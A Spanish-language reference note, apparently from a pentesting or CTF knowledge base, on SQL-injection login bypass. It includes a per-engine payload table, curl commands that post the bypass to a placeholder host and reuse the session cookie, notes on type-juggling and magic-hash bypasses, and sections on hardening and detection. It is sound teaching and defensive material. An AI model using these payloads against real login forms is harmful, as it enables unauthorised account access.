---
topic: sqli-auth-bypass
tags: [web, sqli, authentication, bypass]
---

# SQLi en el login — saltarse la autenticación

[🇬🇧 English](sqli-auth-bypass.en.md) | **Español**

> Nota reutilizable. No publicar salidas con credenciales reales.

## Idea

Un login vulnerable concatena usuario y contraseña en una consulta. Si el campo no se parametriza, la entrada puede cerrar la cadena y convertir la condición en siempre verdadera, o comentar el resto de la consulta para que la comprobación de contraseña desaparezca.

```php
$q = "SELECT * FROM users WHERE username = '$u' AND password = '$p'";
```

Con `u = admin` y `p = ' or '1'='1'#`:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' or '1'='1'#'';
```

- `' or '1'='1` cierra la cadena y añade una tautología.
- `#` (MySQL/MariaDB) comenta el cierre y la comprobación restante.
- El `SELECT` devuelve la primera fila y la aplicación crea la sesión.

## Payloads por motor

| Motor | Payload | Comentario |
|---|---|---|
| MySQL / MariaDB | `' or '1'='1'#` | `#` comenta hasta el fin de línea |
| MySQL (sin `#`) | `' or '1'='1'-- -` | El espacio tras `--` es obligatorio |
| PostgreSQL | `' or '1'='1'--` | `--` comenta el resto |
| MSSQL | `' or 1=1--` | `--` comenta el resto |
| Oracle | `' or '1'='1'--` | Ojo con `FROM dual` en otras consultas |
| SQLite | `' or '1'='1'--` | Igual que PostgreSQL |

Variantes útiles cuando el usuario debe existir:

```text
admin'-- -
admin'#
' or 1=1 limit 1-- -
' or 'x'='x
```

## Comprobación rápida

```bash
# ¿el campo refleja errores del motor?
curl -s -X POST http://<HOST>/login.php \
  -d "username=admin'&password=x" | grep -iE "sql|syntax|warning"

# bypass
curl -s -X POST http://<HOST>/login.php \
  --data-urlencode "username=admin" \
  --data-urlencode "password=' or '1'='1'#" -c cookies.txt
curl -s -b cookies.txt http://<HOST>/dashboard.php
```

Señales de que funcionó: `302` a una zona privada, cookie de sesión nueva, contenido que solo ve el administrador.

## Cuándo no es SQLi

- **Type juggling**: `strcmp($_POST['password'], $hash)` con `password[]=x` devuelve `0` y PHP lo trata como igualdad. No hay SQL de por medio.
- **Comparación laxa**: `if ($row['password'] == $input)` con hashes que empiezan por `0e` (magic hashes).
- **JWT o cookies**: el rol viaja en el cliente y se edita a mano (IDOR).

## Blindaje

```php
$stmt = $pdo->prepare('SELECT id, password FROM users WHERE username = ?');
$stmt->execute([$username]);
$row = $stmt->fetch();
if ($row && password_verify($password, $row['password'])) { /* sesión */ }
```

- Consultas preparadas con parámetros vinculados, nunca concatenación.
- `password_hash()`/`password_verify()` (bcrypt/argon2), no MD5/SHA1.
- Validar que los parámetros sean escalares (`is_string`) antes de usarlos.
- Usuario de base de datos con permisos mínimos y errores SQL fuera de la respuesta.
- MFA y bloqueo por intentos como defensa en profundidad.

## Detección

- Peticiones con `'`, `"`, `--`, `#`, `OR 1=1` o `UNION` en campos de login.
- Errores del motor devueltos al cliente o picos de latencia en la base.
- Login correcto con contraseña vacía, usuario inexistente o longitud anómala.
- Correlación: mismo `User-Agent` probando varios usuarios en segundos.

## Referencias

- <https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>
- <https://portswigger.net/web-security/sql-injection>
- <https://owasp.org/www-community/attacks/SQL_Injection>
